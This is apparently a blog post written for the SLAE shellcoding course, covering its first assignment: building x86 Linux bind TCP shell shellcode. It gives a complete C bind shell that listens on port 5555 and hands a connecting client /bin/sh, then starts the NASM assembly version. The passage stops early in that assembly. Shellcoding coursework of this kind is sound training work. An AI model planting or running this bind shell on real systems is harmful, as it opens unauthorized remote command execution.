---
layout: single
title: SLAE Assignment 1 -- TCP Bind Shell
date: 2019-5-4
classes: wide
header:
  teaser: /assets/images/OSCP/pwk.png
tags:
  - SLAE
  - Linux
  - x86
  - Shellcoding
--- 
![](/assets/images/OSCP/OSCP.png)

## Introduction

The first SLAE assignment is to develop shellcode for a bind TCP shell. What is a bind TCP shell? According to [Infosec Institute](https://resources.infosecinstitute.com/icmp-reverse-shell/#gref), a bind shell is "a type of shell in which the target machine opens up a communication port or a listener on the victim machine and waits for an incoming connection. The attacker then connects to the victim machine’s listener which then leads to code or command execution on the server."

I found that while not an easy subject, the actual assembly code construction was not very difficult. The learning curve from this assignment really came from trying to wrap my head around 'socket programming' fundamentals. The hardest part for me was trying to parse man page information about the various syscalls and trying to understand how to format the arguments required for each syscall. Let's jump right into it. 

## Prototype

The first thing we want to do, in order to see the syscalls required to support the creation of a bind shell, is find the simplest implementation of a bind shell in a language higher than assembly. After a bit of googling, the simplest version of a bind shell in C that I could find is the following, with my comments added:

```c
#include <stdio.h>
#include <strings.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void) {

    // This is our first syscall, the socket() call. 
    int listen_sock = socket(AF_INET, SOCK_STREAM, 0);

    // It looks like here we're building a 'struct' which consists of AF_INET, the interface we want to listen on (all), and a port number to bind on. This entire entity will be referenced in arguments for the next syscall: bind()    
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;           
    server_addr.sin_addr.s_addr = INADDR_ANY;  
    server_addr.sin_port = htons(5555);        

    // Our second syscall, and perhaps the most complicated: bind() 
    bind(listen_sock, (struct sockaddr *)&server_addr, sizeof(server_addr));

    // Our third syscall is listen()
    listen(listen_sock, 0);

    // Our fourth syscall is accept() 
    int conn_sock = accept(listen_sock, NULL, NULL);

    // Our fifth syscall, dup2(), is used 3 times
    dup2(conn_sock, 0);
    dup2(conn_sock, 1);
    dup2(conn_sock, 2);

    // Our final syscall is execve(), which runs a program fed to it as a string
    execve("/bin/sh", NULL, NULL);
}
```
Now that that's settled, it's become apparent we need to execute 6 syscalls in our assembly code:
+ socket
+ bind
+ listen
+ accept
+ dup2
+ execve

## Building Our Assembly Code

```nasm
global_start

section .txt
_start:
```
The first thing we want to do is to clear out the registers we're going to use immediately. How do we know what registers we want to use? You can think of your syscall as something like an *arg[0]* in a command line program. So that's always going to correspond with the first register, EAX. Subsequent arguments will follow sequentially: *arg[1]* will correspond to EBX, *arg[2]* will correspond to ECX, etc.

If we consult `man 2 socket` for our first syscall, socket, we see that it takes 3 arguments in the following fashion:`int socket(int domain, int type, int protocol);`

So counting the syscall itself and its 3 arguments, we need to clear the first 4 registers so that we can work with those. Let's clear them by XOR'ing them with themselves so that we clear them in a way that does not introduct NULL BYTEs into our shellcode.

```nasm
global_start

section .txt
_start: 
  
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
	  xor edx, edx```

Let's now figure out what we're going to put into EAX to call socket. We can do this with a `cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep socket` which tells us that the code for socket is 359. Popping 359 as decimal into a hex converter tells us that the hex equivalent is `0x167`







